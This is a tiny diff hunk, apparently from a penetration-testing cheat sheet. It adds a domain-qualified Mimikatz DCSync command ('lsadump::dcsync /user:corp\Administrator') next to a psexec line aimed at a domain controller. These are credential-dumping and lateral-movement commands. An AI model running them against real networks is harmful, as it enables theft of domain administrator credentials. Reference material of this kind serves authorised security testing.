@@ -369,6 +369,7 @@ psexec.exe \\dc01 cmd.exe
 Require Administrator account
 ```
 lsadump::dcsync /user:Administrator
+lsadump::dcsync /user:corp\Administrator
 ```
 
 
